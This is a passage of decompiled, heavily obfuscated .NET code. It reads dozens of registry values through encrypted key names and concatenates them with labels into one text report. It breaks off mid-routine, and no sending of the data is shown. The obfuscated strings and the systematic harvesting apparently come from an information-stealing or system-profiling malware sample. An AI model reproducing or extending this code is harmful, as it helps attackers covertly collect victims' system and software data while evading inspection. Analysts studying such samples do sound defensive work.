						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0013đȜ\u0301ЈԚ\u061aܗࠒञ\u0a0eଝఎ\u0d0dฅ༅စᄏሕጛᐈᔀᘑ\u1713᠂ᤐᨄᬜᱺᵒṘὟ⁏ⅈ≖⍖\u245e╕☕❵⡁⥆⩂⭬ⱪⵯ⸍⽫なㅧ㉬㍻㑻㕥㙊㝉㡎㥃㩏㭄㰿㵿㹳㽸䀻䅙䉶䍶䑦䕣䙰䝦䠳䥕䩴䭾䱪䵼乬你偸優剓卭呵啩嘥坌塬奷婳"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_1bdf;
						}
						goto IL_1c39;
						IL_1bdf:
						num = 151;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("jŇɊ\u034bфՊه܂ࡀ\u094e\u0a7b\u0b3e\u0c5e൳\u0e75ཫ\u106cᅽብጶᑒᕱᙽ\u1777ᡣᥱ\u1a63\u1b7d\u1c2dᵖṮὸ\u2066ℨ≏⍩⑰╶☸✸⠺")), Registry.GetValue(GClass0.smethod_0("\u0013đȜ\u0301ЈԚ\u061aܗࠒञ\u0a0eଝఎ\u0d0dฅ༅စᄏሕጛᐈᔀᘑ\u1713᠂ᤐᨄᬜᱺᵒṘὟ⁏ⅈ≖⍖\u245e╕☕❵⡁⥆⩂⭬ⱪⵯ⸍⽫なㅧ㉬㍻㑻㕥㙊㝉㡎㥃㩏㭄㰿㵿㹳㽸䀻䅙䉶䍶䑦䕣䙰䝦䠳䥕䩴䭾䱪䵼乬你偸優剓卭呵啩嘥坌塬奷婳"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_1c39;
						IL_1c39:
						num = 153;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑓᕝᙎᝎᡙ᥅ᩓᭉ᱃ᵶṡὥ\u2067Ⅰ≡⍩\u2450╙♯❭⠨⥆⩪⭠ⱶ\u2d77⸢⼳"), GClass0.smethod_0("UŠɶ\u036aѣխ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_1c6c;
						}
						goto IL_1cc6;
						IL_1c6c:
						num = 154;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("\\Ũɨ\u032bыե٭ݵ\u0872थਸ਼ସసഺ")), Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑓᕝᙎᝎᡙ᥅ᩓᭉ᱃ᵶṡὥ\u2067Ⅰ≡⍩\u2450╙♯❭⠨⥆⩪⭠ⱶ\u2d77⸢⼳"), GClass0.smethod_0("UŠɶ\u036aѣխ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_1cc6;
						IL_1cc6:
						num = 156;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("fŦɩͲѵե٧ݤࡧ३\u0a7b୮\u0c63\u0d62\u0e68བၐᅘቀፈᑕᕟᙌᝀᡗ᥇ᩑ\u1b4f᱅ᵴṣύ⁹Ⅲ≣⍯\u2456╛♭❣⠦⥄⩨⭦Ɒ\u2d75"), GClass0.smethod_0("UŠɶ\u036aѣխ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_1cf9;
						}
						goto IL_1d53;
						IL_1cf9:
						num = 157;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("^Ůɮ\u0329щի٣ݷ\u0870सਸ\u0b3a")), Registry.GetValue(GClass0.smethod_0("fŦɩͲѵե٧ݤࡧ३\u0a7b୮\u0c63\u0d62\u0e68བၐᅘቀፈᑕᕟᙌᝀᡗ᥇ᩑ\u1b4f᱅ᵴṣύ⁹Ⅲ≣⍯\u2456╛♭❣⠦⥄⩨⭦Ɒ\u2d75"), GClass0.smethod_0("UŠɶ\u036aѣխ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_1d53;
						IL_1d53:
						num = 159;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("yŻɪͷѲՠ٤ݩࡨ।\u0a78୫\u0c64൧\u0e6bཫၯᅥቃፍᑒᕚᙏᝍᡘ᥊ᩒᭊ᱂ᵱṠὦ\u2066ⅿ≠⍪\u2451╘♢❨⡬⥺⩮⭧Ⱬⴤ⹐⽷は"), GClass0.smethod_0("UŠɶ\u036aѣխ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_1d86;
						}
						goto IL_1de0;
						IL_1d86:
						num = 160;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("`ōɌ\u034dѾհٹ\u073c\u087aॴ\u0a7dସ\u0c54൹\u0e7bཥၦᅷባጰᑛᕧᙯᝩ\u1879ᥣ\u1a68᭦\u1c27ᵕṰὪ‸ℸ∺")), Registry.GetValue(GClass0.smethod_0("yŻɪͷѲՠ٤ݩࡨ।\u0a78୫\u0c64൧\u0e6bཫၯᅥቃፍᑒᕚᙏᝍᡘ᥊ᩒᭊ᱂ᵱṠὦ\u2066ⅿ≠⍪\u2451╘♢❨⡬⥺⩮⭧Ⱬⴤ⹐⽷は"), GClass0.smethod_0("UŠɶ\u036aѣխ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_1de0;
						IL_1de0:
						num = 162;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\tċɺ\u0367Ѣհٴݹ\u0878ॴ੨\u0b7b\u0c74൷\u0e7b\u0f7bၿᅵታ\u137dᑢᕪᙿ\u177dᡨ\u197a\u1a62᭺ᱠᵈṆὁ⁕⅒≰⍰⑴╿☻❛⡫⥬⩤⭊ⱖ\u2d7b\u2e7e⽿ばㅾ㉫㌮㑬㕢㙯㜪㡊㥧㩩㭷㱰㵡㹱㼢䀲"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_1e13;
						}
						goto IL_1e6d;
						IL_1e13:
						num = 163;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("[Ÿɻ\u0378ѵսٶ\u0731\u0871ॡ੪ଭ\u0c4f\u0d64\u0e64\u0f78ၽᅢቴጥᐷᔸᘸ\u173a")), Registry.GetValue(GClass0.smethod_0("\tċɺ\u0367Ѣհٴݹ\u0878ॴ੨\u0b7b\u0c74൷\u0e7b\u0f7bၿᅵታ\u137dᑢᕪᙿ\u177dᡨ\u197a\u1a62᭺ᱠᵈṆὁ⁕⅒≰⍰⑴╿☻❛⡫⥬⩤⭊ⱖ\u2d7b\u2e7e⽿ばㅾ㉫㌮㑬㕢㙯㜪㡊㥧㩩㭷㱰㵡㹱㼢䀲"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_1e6d;
						IL_1e6d:
						num = 165;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0019ěȊ\u0317ВԀ\u0604܉ࠈऄਘଋ\u0c04ഇซ་ဏᄅባ፭ᑲᕺᙯ\u176dᡸᥪ\u1a72᭪ᱰᵘṖὑ⁅⅂≀⍀⑄╏☋❫⡛⥜⩔⭺Ⱡⵈ⹆⽁さㅒ㉰㍰㑴㕿㘻㝛㡫㥬㩤㭊㱖㵻㹾㽿䁰䅾䉫䌮䑬䕢䙯䜪䡊䥧䩩䭷䱰䵡乱伢倲"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_1ea0;
						}
						goto IL_1efa;
						IL_1ea0:
						num = 166;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("[Ÿɻ\u0378ѵսٶ\u0731\u0871ॡ੪ଭ\u0c4f\u0d64\u0e64\u0f78ၽᅢቴጥᐷᔸᘸ\u173a")), Registry.GetValue(GClass0.smethod_0("\u0019ěȊ\u0317ВԀ\u0604܉ࠈऄਘଋ\u0c04ഇซ་ဏᄅባ፭ᑲᕺᙯ\u176dᡸᥪ\u1a72᭪ᱰᵘṖὑ⁅⅂≀⍀⑄╏☋❫⡛⥜⩔⭺Ⱡⵈ⹆⽁さㅒ㉰㍰㑴㕿㘻㝛㡫㥬㩤㭊㱖㵻㹾㽿䁰䅾䉫䌮䑬䕢䙯䜪䡊䥧䩩䭷䱰䵡乱伢倲"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_1efa;
						IL_1efa:
						num = 168;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("yŻɪͷѲՠ٤ݩࡨ।\u0a78୫\u0c64൧\u0e6bཫၯᅥቃፍᑒᕚᙏᝍᡘ᥊ᩒᭊ᱁ᵜṂ\u1f4e⁒ⅿ≢⍾⑬╢♲✪⡦⥮⨧⭎Ⱡ\u2d76\u2e6c⽧ひ"), GClass0.smethod_0("NţɃ\u035aѻէ٣ݳࡦ॰\u0a48୧౸"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_1f2d;
						}
						goto IL_1f87;
						IL_1f2d:
						num = 169;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Wżɿ\u0361ѱաٷܭࡣ७ਪ\u0b41౭൵\u0e69འၷᄸሸጺ")), Registry.GetValue(GClass0.smethod_0("yŻɪͷѲՠ٤ݩࡨ।\u0a78୫\u0c64൧\u0e6bཫၯᅥቃፍᑒᕚᙏᝍᡘ᥊ᩒᭊ᱁ᵜṂ\u1f4e⁒ⅿ≢⍾⑬╢♲✪⡦⥮⨧⭎Ⱡ\u2d76\u2e6c⽧ひ"), GClass0.smethod_0("NţɃ\u035aѻէ٣ݳࡦ॰\u0a48୧౸"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_1f87;
						IL_1f87:
						num = 171;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("yŻɪͷѲՠ٤ݩࡨ।\u0a78୫\u0c64൧\u0e6bཫၯᅥቃፍᑒᕚᙏᝍᡘ᥊ᩒᭊ᱁ᵜṂ\u1f4e⁒ⅿ≢⍾⑬╢♲✪⡦⥮⨧⭎Ⱡ\u2d76\u2e6c⽧ひ"), GClass0.smethod_0("LšɅ\u0343э՚ٻݧࡣॳ੦୰\u0c48൧\u0e78"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_1fba;
						}
						goto IL_2014;
						IL_1fba:
						num = 172;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Wżɿ\u0361ѱաٷܭࡣ७ਪ\u0b41౭൵\u0e69འၷᄸሸጺ")), Registry.GetValue(GClass0.smethod_0("yŻɪͷѲՠ٤ݩࡨ।\u0a78୫\u0c64൧\u0e6bཫၯᅥቃፍᑒᕚᙏᝍᡘ᥊ᩒᭊ᱁ᵜṂ\u1f4e⁒ⅿ≢⍾⑬╢♲✪⡦⥮⨧⭎Ⱡ\u2d76\u2e6c⽧ひ"), GClass0.smethod_0("LšɅ\u0343э՚ٻݧࡣॳ੦୰\u0c48൧\u0e78"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_2014;
						IL_2014:
						num = 174;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("qųɲ\u036fѪոټݱ\u0870ॼ\u0a70\u0b63౬൯\u0e63ལ\u1067ᅭቻ፵ᑪᕢᙷ\u1775ᡠᥲ\u1a5a\u1b42\u1c4bᵽṷὬ⁼⅄≔⍹①╺♧❷⡣⤽⩜⭺Ɀⵥ\u2e60⽯さㅛ㉢㍲㑱㕭㙭㝥㡲"), GClass0.smethod_0("Hŧɸ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_2047;
						}
						goto IL_20a1;
						IL_2047:
						num = 175;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("2ŒɿͺѠչ٩ݹ\u0827ग़\u0a7c୵౯൮\u0e61༸\u1038ᄺ")), Registry.GetValue(GClass0.smethod_0("qųɲ\u036fѪոټݱ\u0870ॼ\u0a70\u0b63౬൯\u0e63ལ\u1067ᅭቻ፵ᑪᕢᙷ\u1775ᡠᥲ\u1a5a\u1b42\u1c4bᵽṷὬ⁼⅄≔⍹①╺♧❷⡣⤽⩜⭺Ɀⵥ\u2e60⽯さㅛ㉢㍲㑱㕭㙭㝥㡲"), GClass0.smethod_0("Hŧɸ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_20a1;
						IL_20a1:
						num = 177;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\nĊȅ\u0366ѡձٳݸ\u087bॵ੧\u0b7a౷൶\u0e7c\u0f7aၼᅴቬ፼ᑡᕫᙸ\u177cᡫ\u197b\u1a6d᭻ᱣᵉṁὀ⁖⅓≏⍱⑷╾☼❚⡨⥭⩫⭋ⱓ\u2d79\u2e71⽰てㅣ㉿㍡㑧㕮㘬㝊㡸㥽㩻㭛㱅㵷㹽㽰䁫䅲"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_20d4;
						}
						goto IL_212e;
						IL_20d4:
						num = 178;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Jźɾ\u0375Ѭշظ\u0738࠺")), Registry.GetValue(GClass0.smethod_0("\nĊȅ\u0366ѡձٳݸ\u087bॵ੧\u0b7a౷൶\u0e7c\u0f7aၼᅴቬ፼ᑡᕫᙸ\u177cᡫ\u197b\u1a6d᭻ᱣᵉṁὀ⁖⅓≏⍱⑷╾☼❚⡨⥭⩫⭋ⱓ\u2d79\u2e71⽰てㅣ㉿㍡㑧㕮㘬㝊㡸㥽㩻㭛㱅㵷㹽㽰䁫䅲"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_212e;
						IL_212e:
						num = 180;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("fŦɩͲѵե٧ݤࡧ३\u0a7b୮\u0c63\u0d62\u0e68བၐᅘቀፈᑕᕟᙌᝀᡗ᥇ᩑ\u1b4f᱑ᵨṲὪ⁼Ⅱ≥⍥②╕♘❨⡱⥠⩶⭇ⱔⵅ"), GClass0.smethod_0("FŀɈ\u0367Ѹ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_2161;
						}
						goto IL_21bb;
						IL_2161:
						num = 181;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("\\Ťɽ\u036cѺԧقݓࡀसਸ\u0b3a")), Registry.GetValue(GClass0.smethod_0("fŦɩͲѵե٧ݤࡧ३\u0a7b୮\u0c63\u0d62\u0e68བၐᅘቀፈᑕᕟᙌᝀᡗ᥇ᩑ\u1b4f᱑ᵨṲὪ⁼Ⅱ≥⍥②╕♘❨⡱⥠⩶⭇ⱔⵅ"), GClass0.smethod_0("FŀɈ\u0367Ѹ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_21bb;
						IL_21bb:
						num = 183;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("fŦɩͲѵե٧ݤࡧ३\u0a7b୮\u0c63\u0d62\u0e68བၐᅘቀፈᑕᕟᙌᝀᡗ᥇ᩑ\u1b4f᱑ᵨṲὪ⁼Ⅱ≥⍥②╕♘❨⡱⥠⩶⭁Ᵽ\u2d73"), GClass0.smethod_0("FŀɈ\u0367Ѹ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_21ee;
						}
						goto IL_2248;
						IL_21ee:
						num = 184;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("[ťɾ\u036dѵՄ٤ݶ࠸स\u0a3a")), Registry.GetValue(GClass0.smethod_0("fŦɩͲѵե٧ݤࡧ३\u0a7b୮\u0c63\u0d62\u0e68བၐᅘቀፈᑕᕟᙌᝀᡗ᥇ᩑ\u1b4f᱑ᵨṲὪ⁼Ⅱ≥⍥②╕♘❨⡱⥠⩶⭁Ᵽ\u2d73"), GClass0.smethod_0("FŀɈ\u0367Ѹ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_2248;
						IL_2248:
						num = 186;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑤᕬᙽ\u177fᡦᥴ\u1a60᭸ᱠᵛṃὅ\u206d⅒≴⍲⑰╆♉❷⡠⥳⩧⭄ⱡ\u2d7d\u2e75⽥ぬㅫ㉿㍐㐸㔤㘹㝔㡒㥵㩠㭶㱑㵧㹦"), GClass0.smethod_0("VŖɜ\u034cѮ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_227b;
						}
						goto IL_22d5;
						IL_227b:
						num = 187;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("YŠɺͲѤՙٽݽ\u0879ऱ\u0a40ୠ౹൨\u0e7eཛၸᅦቬ፲ᑥᕠᙶ\u1738ᠸ\u193a")), Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑤᕬᙽ\u177fᡦᥴ\u1a60᭸ᱠᵛṃὅ\u206d⅒≴⍲⑰╆♉❷⡠⥳⩧⭄ⱡ\u2d7d\u2e75⽥ぬㅫ㉿㍐㐸㔤㘹㝔㡒㥵㩠㭶㱑㵧㹦"), GClass0.smethod_0("VŖɜ\u034cѮ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_22d5;
						IL_22d5:
						num = 189;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("pżɳ\u036cѫտٽݲ\u0871\u0963\u0a71ୠ౭൨\u0e62འၦᅢቺ፶ᑫᕥᙶ\u1776ᡡ᥍\u1a5b\u1b41\u1c4aᵺṶὯ⁽⅋≒⍴⑭┳♽❷⠰⥋⩫⭫Ⱪ\u2d6a\u2e7e⽕せㅢ㉲㍱㑭㕭㙥㝲"), GClass0.smethod_0("Hŧɸ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_2308;
						}
						goto IL_2362;
						IL_2308:
						num = 190;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("TŮɷ\u032dѣխتݍ\u086dॡ\u0a63\u0b64\u0c70സ\u0e38༺")), Registry.GetValue(GClass0.smethod_0("pżɳ\u036cѫտٽݲ\u0871\u0963\u0a71ୠ౭൨\u0e62འၦᅢቺ፶ᑫᕥᙶ\u1776ᡡ᥍\u1a5b\u1b41\u1c4aᵺṶὯ⁽⅋≒⍴⑭┳♽❷⠰⥋⩫⭫Ⱪ\u2d6a\u2e7e⽕せㅢ㉲㍱㑭㕭㙥㝲"), GClass0.smethod_0("Hŧɸ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_2362;
						IL_2362:
						num = 192;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0012Ēȝ\u030eЉԙ؛ܐࠓझਏ\u0b02ఏഎค༂ငᄌሔጔᐉᔃᘐ\u1714᠃ᤓᨅ᭣ᱻᵑṙ\u1f58⁎⅋≗⍙\u245f╖☔❲⡀⥅⩃⭳Ⱬⵁ⹉⽈ぞㅛ㉇㍉㑏㕆㘄㝢㡐㥕㩓㭃㱊㵵㹹㼻䁘䅸䉬䍣䑺䕰䘴䝵䡽䥣䨰䭂䱧䵩乨佧偯儤剭卦呴啱噬圣塋奈"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_2395;
						}
						goto IL_23ef;
						IL_2395:
						num = 193;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("uňɺ\u033eџսٯݮ\u0875ॽ\u0a37୰౺൦ำཟၸᅴቫ።ᑨᔡ᙮ᝫ\u187b\u197c\u1a6fᬦ\u1c4cᵍḸἸ›")), Registry.GetValue(GClass0.smethod_0("\u0012Ēȝ\u030eЉԙ؛ܐࠓझਏ\u0b02ఏഎค༂ငᄌሔጔᐉᔃᘐ\u1714᠃ᤓᨅ᭣ᱻᵑṙ\u1f58⁎⅋≗⍙\u245f╖☔❲⡀⥅⩃⭳Ⱬⵁ⹉⽈ぞㅛ㉇㍉㑏㕆㘄㝢㡐㥕㩓㭃㱊㵵㹹㼻䁘䅸䉬䍣䑺䕰䘴䝵䡽䥣䨰䭂䱧䵩乨佧偯儤剭卦呴啱噬圣塋奈"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_23ef;
						IL_23ef:
						num = 195;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑤᕬᙽ\u177fᡦᥴ\u1a60᭸ᱦᵎṄὃ\u206bⅬ≲⍲⑲╹☹❙⡥⥢⩦⭈ⱖⵓ⸱⽗のㅣ㉨㍿㑗㕞㙡㝭㠧㥕㩬㭩㱰㴢㸳"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_2422;
						}
						goto IL_247c;
						IL_2422:
						num = 196;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("_Ţɬ\u0328єկ٨ݷ࠸स\u0a3a")), Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑤᕬᙽ\u177fᡦᥴ\u1a60᭸ᱦᵎṄὃ\u206bⅬ≲⍲⑲╹☹❙⡥⥢⩦⭈ⱖⵓ⸱⽗のㅣ㉨㍿㑗㕞㙡㝭㠧㥕㩬㭩㱰㴢㸳"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_247c;
						IL_247c:
						num = 198;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0002Ăȍ\u031eЙԉ؋܀ࠃऍਟ୲౿ൾ\u0e74\u0f72\u1074ᅼቤ፤ᑹᕳᙠᝤᡳᥣ\u1a75\u1b73ᱫᵁṉὈ⁞⅛≇⍉\u244f╆☄❢⡐⥕⩓⭃ⱛⵜ⸼⽜ほㅴ㉽㍤㑊㕁㙼㝶㠲㥂㩹㭢㱽㴭㸾㼫䁟䅧䉡䍱䑣䕷䙷䝪䡶䥸"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_24af;
						}
						goto IL_2509;
						IL_24af:
						num = 199;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Lſɳ\u0335чպٿݢ࠰ऽਮ\u0b58\u0c62\u0d62\u0e7cཬၺᅴቯ፱ᑽᔸᘸ\u173a")), Registry.GetValue(GClass0.smethod_0("\u0002Ăȍ\u031eЙԉ؋܀ࠃऍਟ୲౿ൾ\u0e74\u0f72\u1074ᅼቤ፤ᑹᕳᙠᝤᡳᥣ\u1a75\u1b73ᱫᵁṉὈ⁞⅛≇⍉\u244f╆☄❢⡐⥕⩓⭃ⱛⵜ⸼⽜ほㅴ㉽㍤㑊㕁㙼㝶㠲㥂㩹㭢㱽㴭㸾㼫䁟䅧䉡䍱䑣䕷䙷䝪䡶䥸"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_2509;
						IL_2509:
						num = 201;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0001ăȂ\u031fКԈ،܁ࠀऌ\u0a60୳౼ൿ\u0e73\u0f73ၷᅽቫ፥ᑺᕲᙧᝥᡰᥢ\u1a6a\u1b72ᱨᵀṎὉ⁝⅚≈⍈\u244c╇☃❣⡓⥔⩬⭂ⱘⵝ⸻⽝へㅵ㉲㍥㑉㕀㙻㝷㠱㥃㩦㭣㱾㴬㸹㼪䁇䅡䉠䍮䑱䕨䙪䝤䡤"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_253c;
						}
						goto IL_2596;
						IL_253c:
						num = 202;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Cžɰ\u0334рջټݣ\u082f\u093cਭ\u0b42\u0c62൭\u0e61\u0f7c\u106bᅯባ፡ᐸᔸᘺ")), Registry.GetValue(GClass0.smethod_0("\u0001ăȂ\u031fКԈ،܁ࠀऌ\u0a60୳౼ൿ\u0e73\u0f73ၷᅽቫ፥ᑺᕲᙧᝥᡰᥢ\u1a6a\u1b72ᱨᵀṎὉ⁝⅚≈⍈\u244c╇☃❣⡓⥔⩬⭂ⱘⵝ⸻⽝へㅵ㉲㍥㑉㕀㙻㝷㠱㥃㩦㭣㱾㴬㸹㼪䁇䅡䉠䍮䑱䕨䙪䝤䡤"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_2596;
						IL_2596:
						num = 204;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0019ěȊ\u0317ВԀ\u0604܉ࠈऄਘଋ\u0c04ഇซ་ဏᄅባ፭ᑲᕺᙯ\u176dᡸᥪ\u1a72᭪ᱰᵘṖὑ⁅⅂≀⍀⑄╏☋❫⡛⥜⩔⭺Ⱡⵥ⸃⽥\u3040ㅍ㉺㍭㑁㕈㙳㝿㠹㥋㩾㭻㱦㴴㸡㼲䁞䅠䉪䍠䐭䕊䙤䝸䠩䥊䩲䭵䱬䵪书佱偲"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_25c9;
						}
						goto IL_2623;
						IL_25c9:
						num = 205;
